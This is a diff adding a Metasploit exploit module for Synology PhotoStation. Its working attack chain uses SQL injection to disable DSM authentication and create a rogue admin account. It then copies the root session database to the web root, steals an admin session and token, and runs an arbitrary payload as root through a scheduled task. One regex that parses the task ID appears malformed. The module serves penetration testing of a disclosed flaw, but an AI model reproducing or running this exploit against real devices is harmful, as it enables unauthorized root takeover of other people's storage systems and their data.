@@ -1,0 +1,365 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::FileDropper
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Synology PhotoStation Multiple Vulnerabilities",
+      'Description'    => %q{
+        This module exploits multiple vulnerabilities in Synology PhotoStation.
+        When combined these issues can be leveraged to gain a remote root shell.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'James Bercegay',
+        ],
+      'References'     =>
+        [
+          [ 'URL', 'http://gulftech.org/' ]
+        ],
+      'Privileged'     => false,
+      'Payload'        =>
+        {
+          'DisableNops' => true
+        },
+      'Platform'       => ['unix'],
+      'Arch'           => ARCH_CMD,
+      'Targets'        => [ ['Automatic', {}] ],
+      'DisclosureDate' => '2018-01-08',
+      'DefaultTarget'  => 0))
+
+      register_options(
+      [
+        OptString.new('DSMPORT',   [ true,  "The default DSM port", '5000']),
+      ])
+  end
+
+  def check
+
+    res = send_request_cgi(
+      {
+        'uri'       =>  '/photo/include/blog/label.php',
+        'method'    => 'POST',
+        'vars_post' =>
+          {
+            'action' =>'get_article_label',
+            'article_id' => "1; SELECT user; -- "
+          },
+      })
+
+    if res and res.body =~ /PhotoStation/
+      return Exploit::CheckCode::Vulnerable
+    else
+      return Exploit::CheckCode::Safe
+    end
+  end
+
+  def exploit
+
+  rnum = rand(1000)
+  rstr = Rex::Text.rand_text_alpha(10)  
+
+  uuid = rnum # User ID
+  upwd = rstr # User Password
+  uusr = rstr # User name
+  
+  vol1 = '/volume1'
+  audb = '/usr/syno/etc/private/session/current.users'
+
+###########################################################################
+# STEP 00: Force PhotoStation to NOT use DSM for the authentication system
+###########################################################################
+
+    print_status("Switching authentication system to PhotoStation via SQL Injection")
+
+    res = send_request_cgi(
+      {
+        'uri'       =>  '/photo/include/blog/label.php',
+        'method'    => 'POST',
+        'vars_post' =>
+          {
+            'action' =>'get_article_label',
+            'article_id' => "1; UPDATE photo_config SET config_value=0 WHERE config_key='account_system'; -- "
+          },
+      })
+
+###########################################################################
+# STEP 01: Create an admin user
+###########################################################################
+
+    print_status("Creating admin user: #{uusr} => #{upwd}")
+
+    # Password hash
+    umd5 = Rex::Text.md5(upwd)
+
+    res = send_request_cgi(
+      {
+        'uri'       =>  '/photo/include/blog/label.php',
+        'method'    => 'POST',
+        'vars_post' =>
+          {
+            'action' =>'get_article_label',
+            'article_id' => "1; INSERT INTO photo_user (userid, username, password, admin) VALUES (#{uuid}, '#{uusr}', '#{umd5}', TRUE); -- "
+          },
+      })
+
+###########################################################################
+# STEP 02: Authenticate and store session identifier
+###########################################################################
+
+    print_status("Authenticating as admin user: #{uusr}")
+
+    res = send_request_cgi(
+      {
+        'uri'       =>  '/photo/webapi/auth.php',
+        'method'    => 'POST',
+        'vars_post' =>
+          {
+            'api' =>'SYNO.PhotoStation.Auth',
+            'method' => 'login',
+            'version' =>'1',
+            'username' => uusr,
+            'password' => upwd,
+            'enable_syno_token' => 'TRUE',
+
+          },
+      })
+
+    if not res or not res.headers or not res.headers['Set-Cookie']
+      print_error("Unable to retrieve session identifier! Aborting ...")
+      return
+    end
+
+  uckv =  res.headers['Set-Cookie']
+  psid = /PHPSESSID=([a-z0-9]+);/.match(uckv)[1]
+
+  print_status("Got PHP Session ID: #{psid}")
+
+###########################################################################
+# STEP 03: Delete any existing path names used from the database
+###########################################################################
+
+  print_status("Making sure there are no duplicate path index conflicts ...")
+
+    res = send_request_cgi(
+      {
+        'uri'       =>  '/photo/include/blog/label.php',
+        'method'    => 'POST',
+        'vars_post' =>
+          {
+            'action' =>'get_article_label',
+            'article_id' => "1; DELETE FROM video WHERE path='#{audb}'; -- "
+          },
+      })
+
+    res = send_request_cgi(
+      {
+        'uri'       =>  '/photo/include/blog/label.php',
+        'method'    => 'POST',
+        'vars_post' =>
+          {
+            'action' =>'get_article_label',
+            'article_id' => "1; DELETE FROM video WHERE path='#{vol1}/photo///current.users'; -- "
+          },
+      })
+
+###########################################################################
+# STEP 04: Create a record for our malicious path in the database
+###########################################################################
+
+  print_status("Creating video record with bad 'path' data via SQL injection")
+
+    res = send_request_cgi(
+      {
+        'uri'       =>  '/photo/include/blog/label.php',
+        'method'    => 'POST',
+        'vars_post' =>
+          {
+            'action' =>'get_article_label',
+            'article_id' => "1; INSERT INTO video (id, path, title, container_type) VALUES (#{rnum}, '#{audb}', '#{rstr}', '#{rstr}'); -- "
+          },
+      })
+
+###########################################################################
+# STEP 05: Copy session database as root, to the web directory for reading
+###########################################################################
+
+  print_status("Making a copy of the session db as root via synophotoio")
+
+    res = send_request_cgi(
+      {
+        'uri'       =>  '/photo/include/photo/album_util.php',
+        'method'    => 'POST',
+        'vars_post' =>
+          {
+            'action' =>'copy_items',
+            'destination' => '2f', 
+            'video_list' => rnum
+          },
+        'cookie' => uckv
+      })
+
+###########################################################################
+# STEP 06: Move the session db copy to the web root for retrieval
+###########################################################################
+
+  print_status("Moving session db to webroot for retrieval")
+
+    res = send_request_cgi(
+      {
+        'uri'       =>  '/photo/include/file_upload.php',
+        'method'    => 'POST',
+        'vars_get' =>
+        {
+          # /../@appstore/PhotoStation/photo/
+            'dir' =>'2f2e2e2f4061707073746f72652f50686f746f53746174696f6e2f70686f746f2f',
+            'name' => "2f",
+            'fname' => "#{rstr}",
+            'sid' => "#{psid}",
+            'action' => 'aviary_add',
+        },
+        'vars_post' =>
+          {
+            'url' => 'file://' + vol1 + '/photo/current.users'
+          },
+        'cookie' => uckv
+      })
+
+###########################################################################
+# STEP 07: Retrieve and read the session db
+###########################################################################
+
+  print_status("Attempting to read session db")
+
+    res = send_request_cgi(
+      {
+        'uri'       =>  "/photo/#{rstr}.jpg",
+        'method'    => 'GET'
+      })
+
+    if not res or not res.body
+      print_error("Unable to retrieve session file! Aborting ...")
+      return
+    end
+
+    host = /"host": "([^"]+)"/.match(res.body)[1]
+    sess = /"id": "([^"]+)"/.match(res.body)[1]
+    syno = /"synotoken": "([^"]+)"/.match(res.body)[1]
+
+    print_status("Extracted admin session: #{sess} @ #{host}")
+
+###########################################################################
+# STEP 08: Registering files for cleanup
+###########################################################################
+
+    # Uncomment for cleanup functionality
+    # register_files_for_cleanup("#{vol1}/photo/current.users")
+    # register_files_for_cleanup("#{vol1}/@appstore/PhotoStation/photo/#{rstr}.jpg")
+
+###########################################################################
+# STEP 09: Create a task containing our payload
+###########################################################################
+
+  print_status("Creating privileged task to run as root")
+
+  # Switch to DSM port from here on out
+  datastore['RPORT'] = datastore['DSMPORT']
+
+    res = send_request_cgi(
+      {
+        'uri'       =>  '/webapi/entry.cgi',
+        'headers' => 
+        { 
+          'X-SYNO-TOKEN' => syno, 
+          'Client-IP' => host 
+        },
+        'method'    => 'POST',
+        'vars_post' =>
+          {
+            'name' => '"whatevs"',
+            'owner' => '"root"',
+            'enable' => 'true',
+            'schedule' =>'{"date_type":0,"week_day":"0,1,2,3,4,5,6","hour":0,"minute":0,"repeat_hour":0,"repeat_min":0,"last_work_hour":0,"repeat_min_store_config":[1,5,10,15,20,30],"repeat_hour_store_config":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23]}',
+            'extra' => '{"notify_enable":false,"script":"' + payload.encoded.gsub(/"/,'\"') + '","notify_mail":"","notify_if_error":false}',
+            'type' => '"script"',
+            'api' => 'SYNO.Core.TaskScheduler',
+            'method' => 'create',
+            'version' => '2',
+
+          },
+        'cookie' => "id=#{sess}"
+      })
+
+    if not res or not res.body
+      print_error("Unable to create task! Aborting ...")
+      return
+    end
+
+    task = /{"id"\d+)},"success":true}/.match(res.body)[1]
+
+    print_status("Task created successfully: ID => #{task}")
+
+###########################################################################
+# STEP 10: Execute the selected payload
+###########################################################################
+
+  print_status("Running selected task as root. Get ready for shell!")
+
+    res = send_request_cgi(
+      {
+        'uri'       =>  '/webapi/entry.cgi',
+        'headers' => 
+        { 
+          'X-SYNO-TOKEN' => syno, 
+          'Client-IP' => host 
+        },
+        'method'    => 'POST',
+        'vars_post' =>
+          {
+      'stop_when_error' => 'false',
+      'mode' => '"sequential"',
+      'compound' => '[{"api":"SYNO.Core.TaskScheduler","method":"run","version":1,"task":[' + task + ']}]',
+      'api' => 'SYNO.Entry.Request',
+      'method' => 'request',
+      'version' => '1'
+          },
+        'cookie' => "id=#{sess}"
+      })
+
+###########################################################################
+# STEP 11: Delete payload task from scheduler
+###########################################################################
+
+  print_status("Deleting malicious task from task scheduler")
+
+    res = send_request_cgi(
+      {
+        'uri'       =>  '/webapi/entry.cgi',
+        'headers' => 
+        { 
+          'X-SYNO-TOKEN' => syno, 
+          'Client-IP' => host 
+        },
+        'method'    => 'POST',
+        'vars_post' =>
+          {
+      'stop_when_error' => 'false',
+      'mode' => '"sequential"',
+      'compound' => '[{"api":"SYNO.Core.TaskScheduler","method":"delete","version":1,"task":[' + task + ']}]',
+      'api' => 'SYNO.Entry.Request',
+      'method' => 'request',
+      'version' => '1'
+          },
+        'cookie' => "id=#{sess}"
+      })
+
+    end
+end
